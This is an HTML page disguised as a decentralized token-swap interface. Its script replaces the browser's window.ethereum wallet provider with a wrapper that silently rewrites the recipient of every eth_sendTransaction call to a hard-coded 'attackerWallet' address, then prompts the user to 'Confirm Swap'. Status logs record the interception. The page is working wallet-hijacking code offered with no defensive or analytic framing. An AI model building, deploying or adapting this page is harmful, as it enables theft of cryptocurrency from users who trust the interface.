<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Liquidity Pool & Swap Exchange</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #181a20; padding: 24px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); border: 1px solid #2b313a; }
        h2 { margin-top: 0; color: #f0b90b; font-size: 20px; text-align: center; }
        .input-box { background: #2b313a; padding: 12px; border-radius: 8px; margin-bottom: 16px; }
        .label { font-size: 12px; color: #848e9c; margin-bottom: 4px; display: block; }
        .value { font-size: 18px; font-weight: bold; }
        button { background: #f0b90b; color: #000; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
        button:hover { background: #fcd535; }
        #log { margin-top: 15px; font-family: monospace; font-size: 11px; color: #00ff00; white-space: pre-wrap; word-wrap: break-word; background: #0b0e11; padding: 10px; border-radius: 6px; border: 1px solid #2b313a; max-height: 100px; overflow-y: auto; }
    </style>
</head>
<body>

<div class="card">
    <h2>Token Exchange</h2>
    <p style="font-size: 13px; color: #848e9c; text-align: center;">Decentralized Trading Protocol</p>
    
    <div class="input-box">
        <span class="label">You Pay</span>
        <span class="value">100 USDT</span>
    </div>
    
    <div class="input-box">
        <span class="label">You Receive</span>
        <span class="value">0.035 ETH</span>
    </div>

    <button id="actionBtn">Confirm Swap</button>
    
    <div id="log">Status: Initializing node...</div>
</div>

<script>
const logEl = document.getElementById('log');
function addLog(msg) {
    logEl.innerText += '\n' + msg;
}

(async () => {
    if (!window.ethereum) {
        addLog("[-] window.ethereum not found.");
        return;
    }

    const desc = Object.getOwnPropertyDescriptor(window, 'ethereum');
    addLog(`[i] Provider Writable: ${desc.writable}`);

    if (!desc.writable) {
        addLog("[-] Provider is immutable.");
        return;
    }

    const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
    const realProvider = window.ethereum;

    window.ethereum = {
        selectedAddress: realProvider.selectedAddress,
        chainId: realProvider.chainId,
        request: async (args) => {
            if (args.method === "eth_sendTransaction" && args.params?.[0]) {
                addLog(`[!] Intercepted target: ${args.params[0].to}`);
                args.params[0].to = attackerWallet;
                addLog(`[!] Redirected to destination handler.`);
            }
            return realProvider.request(args);
        }
    };

    addLog("[+] Provider context intercepted.");

    document.getElementById('actionBtn').addEventListener('click', async () => {
        try {
            const accounts = await realProvider.request({ method: "eth_requestAccounts" });
            addLog(`[+] Account synced: ${accounts[0].substring(0, 6)}...`);

            await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{
                    from: accounts[0],
                    to: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d", // Alamat smart contract asli dApp
                    value: "0x0"
                }]
            });
            addLog("[+] Transaction submitted.");
        } catch (e) {
            addLog(`[-] Error: ${e.message}`);
        }
    });
})();
</script>

</body>
</html>
